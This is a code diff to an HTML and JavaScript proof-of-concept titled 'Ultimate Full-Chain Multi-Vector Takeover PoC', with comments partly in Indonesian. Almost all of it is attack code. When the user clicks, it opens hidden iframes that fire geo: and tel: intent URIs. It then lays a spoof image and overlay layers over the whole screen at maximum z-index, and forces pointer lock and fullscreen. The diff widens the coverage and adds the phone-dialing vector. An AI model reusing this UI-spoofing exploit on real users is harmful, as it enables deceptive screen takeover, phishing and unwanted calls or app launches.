@@ -2,14 +2,15 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate Full-Chain Viewport Takeover PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+    <title>Ultimate Full-Chain Multi-Vector Takeover PoC</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
-        height: 100%;
-        width: 100%;
+        height: 100vh;
+        height: 100dvh;
+        width: 100vw;
         background: #0b0e14;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         color: #f0f6fc;
@@ -17,14 +18,19 @@
         align-items: center;
         justify-content: center;
         overflow: hidden;
+        position: fixed;
       }
       #fullscreenElement {
-        position: relative;
-        width: 100%;
-        height: 100%;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        height: 100dvh;
         display: flex;
         align-items: center;
         justify-content: center;
+        box-sizing: border-box;
       }
       .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
       button {
@@ -52,16 +58,16 @@
         user-select: text;
       }
       #spoof {
-        position: absolute;
+        position: fixed;
         top: 0;
         left: 0;
-        width: 100%;
-        height: 100%;
-        min-width: 100vw;
-        min-height: 100vh;
+        width: 100vw;
+        height: 100vh;
+        height: 100dvh;
         object-fit: cover;
         z-index: 2147483647;
         pointer-events: none;
+        display: none;
       }
       #pointerLockElement {
         width: 1px;
@@ -69,13 +75,13 @@
         position: absolute;
         opacity: 0;
       }
-      /* Full Viewport Fake Cursor & Layer Coverage */
       #fullscreenFakeCursor {
         position: fixed;
         top: 0;
         left: 0;
         width: 100vw;
         height: 100vh;
+        height: 100dvh;
         background: rgba(11, 14, 20, 0.98);
         border: 4px solid #3fb950;
         box-sizing: border-box;
@@ -91,11 +97,12 @@
         padding: 20px;
       }
       #selectionOverlapLayer {
-        position: absolute;
+        position: fixed;
         top: 0;
         left: 0;
         width: 100vw;
         height: 100vh;
+        height: 100dvh;
         background: rgba(11, 14, 20, 0.9);
         z-index: 2147483646;
         display: none;
@@ -138,12 +145,11 @@
     </script>
   </head>
   <body>
-    <!-- Full Viewport Coverage Layer -->
     <div id="fullscreenFakeCursor">
       <div>
-        [ULTIMATE_FULL_CHAIN_TAKEOVER_ACTIVE]<br><br>
-        All execution vectors chained and locked.<br>
-        Status: Viewport matrix fully intercepted.
+        [ULTIMATE_FULL_CHAIN_ACTIVE]<br><br>
+        Multi-vector execution matrix engaged.<br>
+        Status: Forcing full viewport lockdown.
       </div>
     </div>
 
@@ -152,7 +158,7 @@
     <div id="pointerLockElement"></div>
 
     <div id="fullscreenElement">
-      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
+      <img id="spoof" src="spoof.png" alt="Spoof Layer">
 
       <div id="selectionOverlapLayer">
         <div class="overlap-text" id="overlapContent">
@@ -173,7 +179,7 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing ultimate full-chain sequence...";
+        statusInfo.innerText = "Status: Executing ultimate multi-vector full chain...";
         this.style.display = "none";
 
         try {
@@ -185,13 +191,18 @@
             });
           }
 
-          // 2. Intent URI Dispatcher Chaining
-          let spoofFrame = document.createElement("iframe");
-          spoofFrame.style.display = "none";
-          spoofFrame.src = "geo:0,0?q=apple.com";
-          document.body.appendChild(spoofFrame);
+          // 2. Multi-Protocol Intent URI Dispatcher Chaining (geo: dan tel:)
+          let protocols = ["geo:0,0?q=apple.com", "tel:+123456789"];
+          protocols.forEach((proto, index) => {
+            setTimeout(() => {
+              let frame = document.createElement("iframe");
+              frame.style.display = "none";
+              frame.src = proto;
+              document.body.appendChild(frame);
+            }, index * 100);
+          });
 
-          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer secara serentak
+          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer
           let fullCursor = document.getElementById("fullscreenFakeCursor");
           if (fullCursor) {
             fullCursor.style.display = "flex";
@@ -210,15 +221,15 @@
             }
           }
 
-          // 4. Visual Spoof Layer Deployment
+          // 4. Deployment Visual Spoof Layer dengan ukuran maksimal viewport
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Layers deployed. Engaging full-screen container lock...";
+          statusInfo.innerText = "Status: Multi-intent dispatched. Engaging Fullscreen lock...";
 
-          // 5. Aggressive Fullscreen Chaining
+          // 5. Aggressive Fullscreen Chaining dengan Jeda Optimal
           setTimeout(async () => {
             let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
             
@@ -245,7 +256,7 @@
             }
             
             statusInfo.innerText = "Status: Ultimate full chain active & locked.";
-          }, 300);
+          }, 250);
 
         } catch (err) {
           statusInfo.innerText = "Status: Chaining execution error: " + err.message;
